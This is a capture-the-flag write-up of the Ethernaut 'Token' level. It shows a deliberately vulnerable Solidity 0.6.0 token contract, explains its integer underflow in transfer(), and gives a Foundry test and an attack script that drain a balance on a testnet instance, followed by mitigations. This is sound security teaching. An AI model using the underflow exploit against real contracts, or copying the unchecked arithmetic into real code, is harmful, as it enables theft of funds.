# Level 5: Token

**Level Page**: [See on Ethernaut](https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407)

**Description**:

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

Things that might help:

- What is an odometer?

`Description after completing level`:

Overflows are very common in solidity and must be checked for with control statements such as:

```javascript
if(a + c > a) {
  a = a + c;
}
```

An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

```javascript
a = a.add(c);
```

If there is an overflow, the code will revert.

**Code**:

<details>
<summary>Code to be exploited</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

</details>

# Findings

### [M-1] Uint overflow allows anyone to update the token balance to a huge one

**Description**: The solidity `uint256` has a limit of numbers, where the max number is `2**256 - 1` and the minimum is `0` (zero). Because of that you can face problems when casting or while making some calculation, so we need to be careful, mainly when using an old version of solidity as `0.6.0`. After Solidity version `0.8.0`, if there is an overflow or underflow, the code will revert.

But, as the code is using solidity `0.6.0`, the overflow and underflow are allowed. This means that if the `_value` in the `Token::transfer` function is the total amount of tokens that the sender has plus one, the contract would calculate something like:
- `userBalance = userBalance - (userBalance + 1)` 

this is the same as 

- `userBalance = 0 - 1`

and here we have an underflow, where `userBalance` would be something like: `115792089237316195423570985008687907853269984665640564039457584007913129639935` that is the `uint256` max number.

```javascript
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
@>      balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```

**Impact**: Users can update their token balance to be a huge number by exploiting an underflow.

**Proof of Code**

Code snippet from `TokenAttack.t.sol`.

```javascript
function testShouldStoleAllTokens() public{
  address receiver = makeAddr("receiver");

  vm.prank(attacker);
  token.transfer(receiver, INITIAL_SUPPLY+1);

  uint256 underflowNumber = uint256(0 - 1); //115792089237316195423...
  assertEq(token.balanceOf(attacker), underflowNumber);
}
```

**Recommended Mitigation**: There are some recommendations to fix this issue:

- Use the [SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math) library from OpenZeppelin that already addresses this problem.
- Use a later Solidity version, recommended above `0.8.13`. Later versions do not allow integers overflow and underflows.

```diff
- pragma solidity 0.6.0;
+ pragma solidity 0.8.20;
```

- Use a pattern to develop Tokens as OpenZeppelin [ERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol). These patterns already addresses these problems.

# Attack

**Description**: To exploit this bug, we can just execute `Token::transfer` to another address sending in the `_value` the `totalSupply + 1` as your address is the only holder (`make attack`).

Code snippet from `TokenAttack.s.sol`:

```javascript
  // Getting the total Supply
  uint256 totalSupply = token.totalSupply();

  vm.startBroadcast(attackerPK);

  // Attack
  token.transfer(address(0), totalSupply + 1);

  vm.stopBroadcast();
```

And after that run `make submit` to submit the level to Ethernaut contract.

**Instance used**: [0x3B73aDaaFF46681F725bfb23A7414554458C6D0E](https://sepolia.etherscan.io/address/0x3B73aDaaFF46681F725bfb23A7414554458C6D0E)

**Attack Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0x32db0a045a9d64c04301751887f085ef97d6bb4316fbc05b6017630f1906ded3)

**Level Completed Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0xcd583eacd2fb35d4c067497ca4c830d73e2e062b48f439d2196284b79c08e081)

# Getting started

## Build

```bash
make build
```

## Test

```bash
make test
```

## Attack (testnet)

```bash
make attack
```

## Submit level (testnet)

```bash
make submit
```

## Check if you completed the level (testnet)

`true` - You completed the level
`false` - You didn't complete the level

```bash
make check
```